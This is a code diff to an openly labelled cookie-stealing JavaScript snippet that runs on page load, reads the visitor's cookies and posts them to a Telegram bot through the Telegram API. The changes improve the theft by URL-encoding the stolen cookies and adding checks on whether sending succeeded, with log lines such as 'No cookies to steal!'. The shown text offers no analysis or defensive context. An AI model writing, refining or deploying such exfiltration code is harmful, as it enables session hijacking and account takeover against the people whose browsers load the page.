@@ -21,14 +21,22 @@ document.addEventListener('DOMContentLoaded', () => {
     // Check if there are cookies to send
     if (stolenCookies) {
         var telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
-        var message = "Stolen Cookies: " + stolenCookies;  // Properly concatenating
+        var message = "Stolen Cookies: " + encodeURIComponent(stolenCookies);  // Properly encoding cookies
 
+        // Send cookies to Telegram
         fetch(telegramUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: chatId, text: message })
-        }).then(response => console.log("Cookies sent!"))
-          .catch(error => console.error("Error sending cookies:", error));
+        }).then(response => {
+            if (response.ok) {
+                console.log("Cookies sent to Telegram!");
+            } else {
+                console.error("Failed to send cookies.");
+            }
+        }).catch(error => {
+            console.error("Error sending cookies:", error);
+        });
     } else {
         console.log("No cookies to steal!");
     }
